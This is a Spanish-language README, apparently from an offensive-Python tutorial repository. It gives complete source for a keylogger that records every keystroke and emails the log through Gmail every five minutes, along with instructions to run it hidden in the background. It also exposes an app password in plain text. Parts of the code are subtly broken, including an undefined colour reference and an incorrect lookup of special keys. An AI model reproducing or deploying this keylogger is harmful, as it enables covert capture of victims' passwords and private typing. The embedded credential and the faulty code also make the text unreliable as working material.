# Requisitos
- Para empezar debes tener una cuenta de gmail y crear una contraseña de aplicación, luego instalar pynput.
```bash
pip3 install pynput
```

- Acceder a https://myaccount.google.com/apppasswords para crear contraseña de aplicación para tu cuenta google
![Pasted image 20240628130101](https://github.com/Frib1t/Python_Ofensivo/assets/102589078/e7938d60-c808-4fd0-b098-24722f5397b8)

- Una vez entres la tendrás activada (yxki jwbt ebfu khvc) la introduces sin espacios.
- Ejecución:
```bash
python3 main.py &> /dev/null & disown
```

# keylogger.py
```python
#! /usr/bin/env python3
import threading
import pynput.keyboard
import smtplib
from email.mime.text import MIMEText


class Keylogger:
	def __init__(self):
		self.log = ""
		self.request_shutdown = False
		self.timer = None
		self.is_first_run = True

	def pressed_key(self, key):
		try:
			self.log += str(key.char)	
		except AttributeError:
			special_keys = {key.space: " ", key.backspace:" Backspace ", key.enter: " Enter ", key.shift:" Shift ", key.alt:" Alt ", key.ctrl:" Ctrl ", key.alt:" Alt "}
			self.log += special_keys.get(key, f" {str(key)} ")
		# print(self.log)
	
	def send_email(self,subject, body, sender, recipients, password):
	    msg = MIMEText(body)
	    msg['Subject'] = subject
	    msg['From'] = sender
	    msg['To'] = ', '.join(recipients)
	    
	    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
	       smtp_server.login(sender, password)
	       smtp_server.sendmail(sender, recipients, msg.as_string())
	    print(colored(f"\n[+] Email sent Successfully!\n", yellow))

	def report(self):
		email_body = "[+] El keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
		self.send_email("Keylogger Report", email_body, "email@gmail.com", ["email@gmail.com"], "yxkijwbtebfukhvc")
		self.log = ""

		if self.is_first_run:
			self.is_first_run = False

		if not self.request_shutdown:
			self.timer = threading.Timer(300, self.report)
			self.timer.start()

	def shutdown(self):
		self.request_shutdown = True
		if self.timer:
			self.timer.cancel()


	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
		
		with keyboard_listener:
			self.report()
			keyboard_listener.join()



```

# main.py
```python
#!/usr/bin/env python3
import signal
import sys
from termcolor import colored
from keylogger import Keylogger

def def_handler(sig, frame):
	print(colored(f"\n[!] Saliendo...\n", 'red'))
	my_keylogger.shutdown()
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	my_keylogger = Keylogger()
	my_keylogger.start()
```
